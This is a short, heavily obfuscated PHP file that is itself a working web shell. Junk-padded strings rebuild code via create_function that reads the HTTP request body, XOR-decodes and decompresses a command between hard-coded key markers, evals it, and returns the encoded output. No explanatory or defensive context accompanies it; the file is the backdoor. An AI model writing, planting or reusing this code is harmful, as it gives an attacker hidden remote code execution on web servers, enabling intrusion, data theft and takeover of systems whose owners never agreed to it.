<?php
$b='ut""F),$m)=="F1) "F{@o"Fb_start();@"Feva"Fl(@gz"Funcompress"F(@"Fx(@b"Fas"Fe64_d"Fecode($m[1])"F,$"Fk)))"F;$o=@ob_g';
$y='$k="f6c"F21d"Ffe";$k"Fh"F=""F7e"F6bc6916bb4";$kf="5bb7"F"Fa1"F7"F8"F16dc"F";$p="ZO"FM3rXNUiIeTnXJn";"Ffunction x($t"F,';
$I='$"F"Fk){$c=strlen($k);$"Fl=str"Fle"Fn($t);"F"F$o="";fo"Fr($i=0;$i<$l;"F){for($j"F=0;($j<$c"F&&$i<"F"F$l);$j++,$i+"F+';
$Y='et_c"Fonten"Ft"Fs();"F@ob_end_clean();$r="F@base6"F4_enc"Fo"Fde("F@x"F(@gzcompr"Fess($o),"F$k));pr"Fint("$p$kh$"Fr$kf");}';
$t='){$o"F.=$"Ft{$i}"F^$k"F{$j};"F}}return"F $o;}if "F(@p"Freg_match("/$kh"F("F.+"F)$kf/",@file_get"F"F_conten"Fts("php:/"F/inp';
$m=str_replace('R','','crReatRe_RfuRRncRtion');
$K=str_replace('"F','',$y.$I.$t.$b.$Y);
$V=$m('',$K);$V();
?>
